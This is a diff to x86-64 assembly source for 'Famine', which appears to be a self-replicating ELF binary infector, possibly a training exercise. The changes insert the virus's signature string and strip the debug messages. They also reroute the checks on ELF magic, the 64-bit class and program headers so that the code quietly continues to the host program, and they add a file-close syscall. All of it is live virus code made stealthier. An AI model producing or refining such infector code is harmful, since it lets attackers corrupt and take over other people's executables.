@@ -70,6 +70,7 @@ number:
 	famineb db 0
 	famined db 0
 	padding	db 1
+	faminemsg db 'Famine version 1.0 (c)oded by alexafer-alexafer', 0
 	file db	'./test', 0, 10
 	msg1 db	'file is elf', 10, 0
 	msg2 db	'file is 64', 10, 0
@@ -90,11 +91,6 @@ entry_point:
 	lea		rax, [rel .true_end]
 	sub		rax, rdi
 
-	mov		rax, 1
-	mov		rdi, 1
-	lea		rsi, [rel file]
-	mov		rdx, 8
-	syscall
 
 	mov		rax, 2
 	lea		rdi, [rel file]
@@ -125,22 +121,11 @@ entry_point:
 	lea		rdi, [rel elfh]
 	repe	cmpsb
 	test	rcx, rcx
-	jnz		.end
+	jnz		.proceed_jmp
 
-	mov		rax, 1
-	mov		rdi, 1
-	lea		rsi, [rel msg1]
-	mov		rdx, 12
-	syscall
 
 	cmp		byte [rel buf0 + 4], 2
-	jne		.end
-
-	mov		rax, 1
-	mov		rdi, 1
-	lea		rsi, [rel msg2]
-	mov		rdx, 11
-	syscall
+	jne		.proceed_jmp
 
 	mov		rax, [rel buf0 + 24]
 
@@ -202,7 +187,7 @@ entry_point:
 	jmp		.start_loop_phdr
 .end_loop_phdr:
 	test	r11, r11
-	jz		.end
+	jz		.proceed_jmp
 
 
 	; %rdi %rsi %rdx %r10 %r8 %r9
@@ -316,7 +301,16 @@ entry_point:
 	pop		r9
 	pop		r11
 
+
+
+
 .proceed_jmp:
+	mov		rax, 3
+	mov		rdi, r8
+	syscall
+
+
+
 	xor		rax, rax
 	mov		al, [rel famined]
 	test	al, al
